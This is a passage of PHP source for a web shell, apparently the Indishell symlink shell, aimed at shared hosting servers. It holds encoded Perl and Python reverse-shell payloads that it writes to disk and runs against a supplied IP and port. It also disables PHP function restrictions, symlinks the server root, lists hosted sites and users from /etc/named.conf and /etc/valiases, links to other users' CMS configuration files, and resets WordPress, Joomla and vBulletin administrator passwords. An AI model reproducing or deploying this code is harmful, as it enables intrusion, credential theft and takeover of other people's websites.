 
 $pageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $URL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 
 $pageURL =$URL;
 } else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $pageURL;
 
}

 $r= dirname(curPageURL());
  $x=$r."/indishell/root/home/".$un."/public_html/configuration.php";
  
echo "<br \><a href=". $x."><font color=white size=2 face='comic sans ms'>link to configuration.php</a>";
}
	

elseif($r=="vBulletin")
{
	
	$y=trim($_POST["uname"]);
	 
	 function curPageURL() {
 $pageURL = 'http';
 
 $pageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $URL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 
 $pageURL =$URL;
 } else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $pageURL;
 
}

 $r= dirname(curPageURL());
  $x=$r."/indishell/root/home/".$y."/public_html/includes/config.php";
  
echo "<br \><a href=". $x."><font color=white size=2 face='comic sans ms'>link to includes/config.php</a>";
	


	}	
	elseif($r=="any")
	{
	$y=trim($_POST["uname"]);
	
	 function curPageURL() {
 $pageURL = 'http';
 
 $pageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $URL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 
 $pageURL =$URL;
 } else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $pageURL;
 
}

 $r= dirname(curPageURL());
  $x=$r."/indishell/root/home/".$y."/public_html/";
  
echo "<br \><a href=". $x."><font color=white size=2 face='comic sans ms'>link to public_html directory</a>";
	 
	
	}
	}



?>
</td>
<td width=25 align=right><font size=2 color=red face=comic sans ms>
	
	<body bgcolor=black><font color=red><form method=POST>
<font size=2 color=white face='comic sans ms'>Host:<input type=text name=lh value=localhost><br>
<font size=2 color=white face='comic sans ms'>Datbase_name:<input type=text name="dbn" ><br>
<font size=2 color=white face='comic sans ms'>Database_Username:<input type=text name="dbu"><br>
<font size=2 color=white face='comic sans ms'>Database_password:<input type=text name="dbp"><br>
<font size=2 color=white face='comic sans ms'><input type=submit name=sb value=">>" /> </form>
<?php
if(isset($_POST['sb']))
{
$r=$_POST["dbn"];
$s=$_POST["dbu"];
$t=$_POST["dbp"];


$Connect = @mysql_select_db($_POST['dbn'],mysql_pconnect($_POST['lh'],$_POST['dbu'],$_POST['dbp']));

   $sqlcm=@mysql_query("UPDATE 'user' SET 'password' = 'e68f496a84ae3e9d98c130992734648b','salt' = '+-~' WHERE 'userid' = '1' LIMIT 1");
if($sqlcm){ 
echo "try with password 0123456";
}
}


?>


</td><td width=25% align=right><font size=2 color=white face=comic sans ms>Please define table_prefix from config file for accurate result,example $table_prefix='wp_'; here wp_ is table prefix (bydefault its wp_)
<form method=POST><font size=2>
	<br><font size=2 color=white face='comic sans ms'>Host</font><font color=red><input type= name=ht value=localhost><br>
	<font size=2 color=white face='comic sans ms'>Database_name</font><input type=text name=db_name ><br>
<font size=2 color=white face='comic sans ms'>Database_user</font><input type=text name=db_us ><br>
<font size=2 color=white face='comic sans ms'>Database_password</font><input type=text name=db_ps ><br>
<font size=2 color=white face='comic sans ms'>table_prefix</font><input type=text name=tb_pr value=wp_><br>
<font size=2 color=white face='comic sans ms'>New_username</font><input type=text name=nw_name ><br>
<font size=2 color=white face='comic sans ms'>New_pass</font><input type=text name=nw_pass ><br>
<br>
<input type=submit name=smt value=">>" /></form></td><td width=25%  align=right>
<font size=2>Please define dbprefix from config file for accurate result,example var $dbprefix='jos_' ; here jos_ is dbprefix (bydefault its jos_)


	<br><form method=POST><br>
	<font size=2 color=white face='comic sans ms'>Host</font><font color=red><input type= name=ht value=localhost><br>
	<font size=2 color=white face='comic sans ms'>Database_name</font><input type=text name=db_name ><br>
<font size=2 color=white face='comic sans ms'>Database_user</font><input type=text name=db_us ><br>
<font size=2 color=white face='comic sans ms'>Database_password</font><input type=text name=db_ps ><br>
<font size=2 color=white face='comic sans ms'>Dbprefix</font><input type=text name=db_pf value=jos_><br>
<font size=2 color=white face='comic sans ms'>New_username</font><input type=text name=nw_name ><br>
<font size=2 color=white face='comic sans ms'>New_pass</font><input type=text name=nw_pass ><br>
<br>
<input type=submit name=smit value=">>" /></form></td></tr></table>
<?php }
?>

</table>

</table>
<table border=1 width=100%><tr><td align=center><a href="<?php echo '?perlbackconnect';?>"><font size=3 face="comic sans ms" color=white>--==[[PERL Back connect ]]==--</font></a><br>


<?php 
if(isset($_GET['perlbackconnect']))
{ ?>
<font size=2 face="comic sans ms" color=white>
	<p><form method=POST action="">
Client ip:<input type=text name=ip value=<?php echo $_SERVER['REMOTE_ADDR'];?>>
Connection Port:<input type=text name=port /><p>

<input type=submit name=sbm value=">>" /></form>
</font>

<?php 


if(isset($_POST['sbm']))
{
	$r=$_POST["ip"];
	$s=$_POST["port"];
	$p1 ='hVNhb5swEP0eKf/hSqsFpNCE9sOkRFTLUtKibU0FJJrEUGTgWlCJHWGzJZr234dNqBKlVY0E9rtnv3e+4/xsUPFyEOd0sMGy6Ha6nYojuPPRyGfJC4qxhC74jgtcgw09RY0Jz3pNZOLdTe0v9Xup1psypwI0ME3bDsOvJHmZMkoxEeBnWBRRZNumCb/onhCzLbA/FFOIdxAgWYNL05wfUWsyaOrw/Al0JXhmXxnwV0KwF1xw8owjuBhCeM+4iCB8ZGX9kdubzZDmCJqzVSTr6vPlsH4ssK6ta2g5/9r8D3KXy1le4D2haYEK4iqq+/PpNyfow+Ns5T7IiQRWfuA5kx99eEaxKZlg8Y6SNeo9kWx6hgGsVEb2tkMzggUlcYEgGHjIWfEbQWbQWkqa63sVk9okTctVTtVdLEMr6kNOUayIYC02jIwPtNqyHGo1VZazRs28IZVgT0XFM91QDLZBqvvBrfvQB+3mU0PTjmPzRdB/L+Z43kms9Sfr/Nb4qJUOvetaRTnWWbl+MHO/O2No1v5k6UgMxphkrAbrkoBJYPw6VQF10t5W28nv+ak7d37Suf5J5761N61SvFSjQMEhwy2ILOfAs1zAz1s4POAou/1/2Bg8d+azbuc/';
	
   $dec= gzinflate(base64_decode($p1));
   $fname = fopen('backconn.pl','w');
     fwrite($fname,$dec); 
      $d="backconn.pl";
     $ch="chmod +x ".$d ;
            $permission= system($ch);
           
            $z="perl ".$d." ".$r." ".$s;
            $run= system($z);
   
 }  

}
?>
</table><table border=1 width=100%><tr><td align=center>
<a href="<?php echo '?pythonbackconnect'?>">--==[[Python Back connect]]==--</a><p>
<?php
if(isset($_GET['pythonbackconnect']))
{
	?>
<form method=POST >
Clientip:<input type=text name=pyt value=<?php echo $_SERVER['REMOTE_ADDR'];?>>
port:<input type=text name=port /><p>

<input type=submit name=pyb value=">>" /></form>
</font>
<?php
}
?>
<?php
if(isset($_POST['pyb']))
{
	$r=$_POST["pyt"];
	$s=$_POST["port"];
	$py = 'fVLfS8MwEH4X/B9u9WEptJ1O8UEouI0JIjpwe+vK6I/bGpYmJUnV+tebrF2dIEsgucv33eXj7q4Go1rJUUr5qGp0IfjlRbtpWQmpQTXKAyWyPWoPhLXrtJIiQ6WOzEIoDaFlBoncfUQ3sX09RIdAuSY9Mo7dY1CbMlCoc9wmNdOalihqTe6ve45BIM2I+2AdAC2bzgKjaG+/7JIcLtJ5k6fN89t85XXucjF72SxX7/PJq3sSHWSCc8w0IVa+Z9W6f3CFPCfD4fD41q4cP5CJCiWILeiCKlCZpJUGY6V3TCffiXzclQll5oMS1vxv+Ony/TCMoqn4gsUnxxymDawwKeGZ53RZIGNxHIa+b3KsudHRixMqyOtqTKzILWXIBXG96/PwzXl4fB6+/S2M1WUL3w9BkCWMkcg5TJAqHM/xqRN3AfiVoalN14muw30PK2mGA5xoEMOsbQYVHCwrB8Nz/suBUgrpAf6XZG4x+CyMbOi6S/nOMeyWbE87Tj8=';
	
   $dec= gzinflate(base64_decode($py));
   $fname = fopen('backconn.py','w');
     fwrite($fname,$dec); 
      $d="backconn.py";
     $ch="chmod +x ".$d ;
            $permission= system($ch);
           
            $z="python ".$d." ".$r." ".$s;
            $run= system($z);
   
 }     
?>

</table>
<table width=100%><tr><td
	align=center><a href="<?php echo '?ds';?>"><font color=white size=3 face="comic sans ms" >--==[[Generate php.ini file]]==--</a>
	
<?php
if(isset($_GET['ds']))
{
	$htcs  = " disable_functions =none ";
$f = fopen('php.ini','w');


fwrite($f , $htcs);



 function curPageURL() {
 $pageURL = 'http';
 
 $pageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $URL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 
 $pageURL =$URL;
 } else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $pageURL;
 
}

 $r= dirname(curPageURL());
  $x=$r."/php.ini";
  
echo "<br \><a href=". $x."><font color=white size=4 face='comic sans ms'><u>link  to php.ini</u></a>";

}
?></td>
</tr>

	</font></font></font>

</table>
<table border=1 width=100% hight=100%><td align=center> <a href="<?php echo '?bypasser'?>"><font 
	color=white size=2 face="comic sans ms"><b>--==[[</font><font color=red size=2 face="comic sans ms">"Can't read /etc/named.conf" bypasser+auto symlink public_html directory</font><font color=white size=2 face="comic sans ms">]]==--</b><br> 
	</a>
	<?php
	
	if(isset($_GET['bypasser']))
	{
		?>
		<font size=3 color=white face="comic sans ms">Put the websites names(as many as you want) in the  textbox given below for auto symlink websites<br><font color=red><marquee behavior="scroll" direction="left" scrollamount="2" scrolldelay="20" width="50%"><span class="footerlink">Special f**k goes to my best buddy --> "Suriya CyberTyson" :P</span></marquee><br></font>
	<form method=post>
	<font color=white size=2 face=comic sans ms>websites name<br><textarea rows=6 cols=45 name=wen></textarea>
	<br><br><input type=submit name=cant value="bhaiyu.... click me and i will try to hex this shit XD" /></form><p>
	
		
		<?php
		}
	error_reporting(0);
	$tt=$_POST["wen"];




if(isset($_POST['cant']))
{
	
	mkdir('INDIshell',0777);
$rr  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = fopen('INDIshell/.htaccess','w');

$indishell = symlink("/","INDIshell/root");

fwrite($f , $rr);
	
	function RemoveLastSlash($host)
{
	if(strrpos($host, '/', -1) == strlen($host)-1)
	{return substr($host,0,strrpos($host, '/', -1));}
	else{return $host;}
}

	echo "<font color=red>";
	$tt=trim($_POST["wen"]);
	$txt=explode("\n",$tt);
	echo "<table align=center border=1 width=50%>
<tr><td align=center><font size=3 face='comic sans ms' color=white>website(url)</td><td align=center><font size=3 face=comic sans ms color=white>username</font></td><td align=center><font size=3 face=comic sans ms color=white>auto symlink</font></td></tr>";
	foreach($txt as $text)
	{
	$text1=trim($text);
	$te1 = ereg_replace("(https?)://", "", $text1);
	$te2 = ereg_replace("www.", "", $te1);
	$te=RemoveLastSlash($te2);
	$u = posix_getpwuid(@fileowner("/etc/valiases/".$te));
	
echo "<table align=center border=1 width=50%><tr><td align=center><font size=3 face='comic sans ms' color=white><a href=http://".$te."><font size=3 face='comic sans ms' color=red>".$te."</a></font></td><td align=center><font size=3 face='comic sans ms' color=white>". $u['name']." </font></td><td align=center><a href=INDIshell/root/home/".$u['name']."/public_html/><font size=3 face='comic sans ms' color=white>spin the shit XD</a></tr></table>"; 
flush();

	
	
	
}

}
	
	
	
	
	?>
	
	
	
	</table>
<table border=1 width=100% hight=100%><td align=center> <a href="<?php echo '?symlink'?>"><font 
	color=white size=3 face="comic sans ms">--==[[Symlink the "/" folder]]==--<br> (run php.ini before symlink for batter results) 
	</a>
	
	
	<?php
error_reporting(0);
if(isset($_GET['symlink']))
	{

	

$mk = mkdir('indishell',0777);




$r  = " Options all \n DirectoryIndex Sux.html \n AddType text/plain .php \n AddHandler server-parsed .php \n  AddType text/plain .html \n AddHandler txt .html \n Require None \n Satisfy Any";
$f = fopen('indishell/.htaccess','w');

$indishell = symlink("/","indishell/root");

fwrite($f , $r);
function curPageURL() {
 $pageURL = 'http';
 
 $pageURL .= "://";
 if ($_SERVER["SERVER_PORT"] != "80") {
  $URL .= $_SERVER["SERVER_NAME"].":".$_SERVER["SERVER_PORT"].$_SERVER["REQUEST_URI"];
 
 $pageURL =$URL;
 } else {
  $pageURL .= $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"];
 }
 return $pageURL;
 
}

 $r= dirname(curPageURL());
 if(!is_dir('indishell/root'))
 {
	 echo "<br>sorry";}
	 else {
  $x=$r."/indishell/root";
echo "<p><a href=".$x."><font color=white size=4 face='comic sans ms'><u>check this link for symlink </u></a>";
}
}
?>

	
	</font></td></table><table width=100%><td align=center><a href="<?php echo '?etv'?>"><font 
	color=white size=3 face="comic sans ms">--==[[username (ls /etc/valiases)]]==-- </a>
	
	<?php 
echo "<font color=white>";
if(isset($_GET['etv']))

{
echo $head;
 
	echo "<form method=post>";
	echo "<font color=white size=4 face=comic sans ms>website name :<input type=text name=webn>";
	echo "<br>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp<input type=submit name=we value=^_^ /></form><br>";
	}


?>
<?php

if(isset($_POST['we']))
{
	$text=$_POST["webn"];
	
	$text1=trim($text);
	$te1 = ereg_replace("(https?)://", "", $text1);
	$te = ereg_replace("www.", "", $te1);
	
	
	$u = posix_getpwuid(@fileowner("/etc/valiases/".$te));
	
echo "<table align=center border=1 width=40%><tr><td align=center><font size=3 face='comic sans ms' color=white><a href=http://".$te."><font size=3 face='comic sans ms' color=red>".$te."</a></font></td><td align=center><font size=3 face='comic sans ms' color=white>". $u['name']." </font></td></tr></table>"; 
flush();
	
	



}
	
	
	
	
	


?>



	
	</td></tr></table><table width=100%><td align=center><a href="<?php echo '?du';?>"><font 
	color=white size=3 face="comic sans ms">--==[[website and 
	username]]==--<br></a>
	
	<?php
if(isset($_GET['du']))
{

$d0mains = @file("/etc/named.conf");

if(!$d0mains){ die("<font size=3><b><font color=white>error in reading /etc/named.conf "); }

echo "<table align=center border=1>
<tr><td><font size=3 face='comic sans ms'>website</td><td><font size=3 face=comic sans ms>username</font></td></tr>";

foreach($d0mains as $d0main){

if(eregi("zone",$d0main)){

preg_match_all('#zone "(.*)"#', $d0main, $domains);
flush();

if(strlen(trim($domains[1][0])) > 2){ 

$user = posix_getpwuid(@fileowner("/etc/valiases/".$domains[1][0]));

echo "<tr><td><a href=http://www.".$domains[1][0]."/><font color=white face='comic sans ms'>".$domains[1][0]."</a></td><td><font color=white face='comic sans ms'>".$user['name']."</td></tr>"; flush();

}}}
}?>
	
	
	</td>


		










<?php

?>




<?php
if(isset($_GET['wp-reset']))
{
	?>


<?php
}

?>
<?php
if(isset($_POST['smt']))

{
	$host=$_POST["ht"];
	$dbn=$_POST["db_name"];
	$dbu=$_POST["db_us"];
	$dbp=$_POST["db_ps"];
	$nn=$_POST["nw_name"];
	$np=$_POST["nw_pass"];
	$tp=$_POST["tb_pr"];
    $npwd= md5($np);
	$dbconnect=@ mysql_connect($host,$dbu,$dbp);
	$dbslect=@ mysql_select_db($dbn);
	$npwd= md5($np);	
	$ru=@ mysql_query("UPDATE `".$tp."users` SET `user_login` ='".$nn."' WHERE ID = 1") ;
$ru= @ mysql_query("UPDATE `".$tp."users` SET `user_pass` ='".$npwd."' WHERE ID = 1") ;
	
	if(!$ru)
      {
		  echo "<font size=2 color=white face='comic sans ms'><br>something went wrong :P";
		  }
		  else {
			  
			  echo "<font size=2 color=white face='comic sans ms'><br>Bhai ji,try to login with new password :D";
			  }
		  
		}



?>

<?php
if(isset($_POST['smit']))

{
	$host=$_POST["ht"];
	$dbn=$_POST["db_name"];
	$dbu=$_POST["db_us"];
	$dbp=$_POST["db_ps"];
	$dp=$_POST["db_pf"];
	$nn=$_POST["nw_name"];
	$np=$_POST["nw_pass"];
	$npwd= md5($np);
	$dbconnect=@ mysql_connect($host,$dbu,$dbp);
	$dbslect=@ mysql_select_db($dbn);
	$npwd= md5($np);
	$run =@mysql_query("UPDATE `".$dp."users` SET username ='".$nn."' WHERE usertype ='Super Administrator'");
$run =@mysql_query("UPDATE `".$dp."users` SET password ='".$npwd."' WHERE usertype = 'Super Administrator'");
$run =@mysql_query("UPDATE `".$dp."users` SET username ='".$nn."' WHERE usertype = 'deprecated'");
$run =@mysql_query("UPDATE `".$dp."users` SET password ='".$npwd."' WHERE usertype = 'deprecated'");
	if(!$run)
      {
		  echo "<font size=2 color=white face='comic sans ms'><br>something went wrong :P";
		  }
		  else {
			  
			  echo "<font size=2 color=white face='comic sans ms'><br>Bhai ji, try to login with new password :D";
			  }
		  
		
}


?>




 
 
